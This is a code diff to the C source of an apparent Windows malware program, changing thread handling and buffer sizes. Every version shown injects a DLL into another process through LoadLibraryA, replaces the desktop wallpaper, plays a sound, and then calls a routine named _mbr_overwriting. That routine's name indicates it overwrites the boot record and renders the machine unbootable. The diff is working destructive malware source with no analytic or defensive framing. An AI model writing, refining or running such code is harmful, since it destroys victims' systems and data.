@@ -27,7 +27,7 @@ DWORD injected_pid;
 
 // ; current_path + arg ;
 void _join_path(char *dest, char *src) {
-  char currentDir[100];
+  char currentDir[260];
   GetCurrentDirectoryA(sizeof(currentDir), currentDir);
   strcpy(dest, currentDir);
 
@@ -83,8 +83,8 @@ int ProcessInjection(char *process_name, char dll_path[],
   HANDLE processHandle;
   PVOID rbuff;
 
-  HMODULE hKernel32 = GetModuleHandle("Kernel32");
-  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
+  HMODULE kernel32 = GetModuleHandle("Kernel32");
+  VOID *lb = GetProcAddress(kernel32, "LoadLibraryA");
 
   if (!injected_pid) {
     return 1;
@@ -107,41 +107,32 @@ int ProcessInjection(char *process_name, char dll_path[],
   return 0;
 }
 
-DWORD WINAPI CheckProcinjIsRunning() {
+void CheckProcinjIsRunning() {
   if (!injected_pid) {
-    return 0;
+    return;
   }
 
   HANDLE process = OpenProcess(SYNCHRONIZE, FALSE, injected_pid);
-  WaitForSingleObject(process, INFINITE);
+  WaitForSingleObject(process, 25000);
 
   CloseHandle(process);
-
-  return 0;
 }
 
-DWORD WINAPI Underground() {
-  char wallpaper_path[100];
+int Underground() {
+  char wallpaper_path[260];
 
   _join_path(wallpaper_path, "wallpaper.jpg");
 
-  {
-    FILE *wallpaper_fopen = fopen(wallpaper_path, "wb");
-    fwrite(wallpaper_jpg, sizeof(char), wallpaper_jpg_len, wallpaper_fopen);
+  FILE *wallpaper_fopen = fopen(wallpaper_path, "wb");
+  fwrite(wallpaper_jpg, sizeof(char), wallpaper_jpg_len, wallpaper_fopen);
 
-    fclose(wallpaper_fopen);
-  }
+  fclose(wallpaper_fopen);
 
   // > Change wallapaper - `wallpaper_path` <
   SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, TEXT(wallpaper_path),
                        SPIF_UPDATEINIFILE);
 
   PlaySoundA((LPCSTR)song_wav, NULL, SND_MEMORY | SND_ASYNC);
-
-  // > Time to destruction <
-  Sleep(25000);
-
-  _mbr_overwriting();
 
   return 0;
 }
@@ -157,26 +148,23 @@ int main() {
     return 1;
   }
 
-  char dll_path[100];
+  char dll_path[260];
 
   _join_path(dll_path, "essential.dll");
 
   MessageBox(NULL, "CATCH ME!!", "Tip: Process injection :D",
              MB_OK | MB_ICONWARNING);
 
-  HANDLE ht1 = CreateThread(NULL, 0, Underground, NULL, 0, NULL);
+  Underground();
 
   // > Wait starting music <
   Sleep(2000);
 
   ProcessInjection(process_to_inject, dll_path, sizeof(dll_path) + 1);
-  HANDLE ht2 = CreateThread(NULL, 0, CheckProcinjIsRunning, NULL, 0, NULL);
 
-  // > Joining threads <
-  WaitForSingleObject(ht2, INFINITE);
+  CheckProcinjIsRunning();
+
   _mbr_overwriting();
-
-  WaitForSingleObject(ht1, INFINITE);
 
   return 0;
 }
